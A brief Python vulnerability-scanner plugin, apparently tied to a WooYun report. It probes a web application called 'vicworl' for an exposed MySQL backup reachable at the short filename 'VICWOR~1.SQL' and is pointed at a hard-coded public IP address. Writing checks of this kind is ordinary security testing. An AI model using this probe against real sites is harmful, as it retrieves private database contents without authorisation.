#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#http://www.wooyun.org/bugs/wooyun-2010-0106292

def assign(service, arg):
    if service == "vicworl":
        return True, arg


def audit(arg):
    payload = 'data/backup/VICWOR~1.SQL'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'MySQL dump' in res:
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('vicworl', 'http://218.7.16.70/')[1])